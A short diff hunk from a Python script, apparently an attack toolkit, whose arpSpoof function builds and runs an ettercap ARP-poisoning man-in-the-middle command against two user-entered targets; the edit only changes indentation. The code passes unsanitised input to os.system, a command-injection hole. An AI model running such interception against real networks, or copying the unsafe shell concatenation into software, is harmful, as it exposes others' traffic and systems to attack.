@@ -19,8 +19,8 @@ def arpSpoof(interface,plugin):
         target1 = input("\n──╼┤1st TARGET├─> ")
         target2 =   input("──╼┤2nd TARGET├─> ")
 	print("\n")
-        command = "ettercap -T -S -i "+interface+" -P "+plugin+" -M arp:remote /"+target1+"// /"+target2+"//"
-        os.system(command)
+	command = "ettercap -T -S -i "+interface+" -P "+plugin+" -M arp:remote /"+target1+"// /"+target2+"//"
+	os.system(command)
         
 def banner():
 
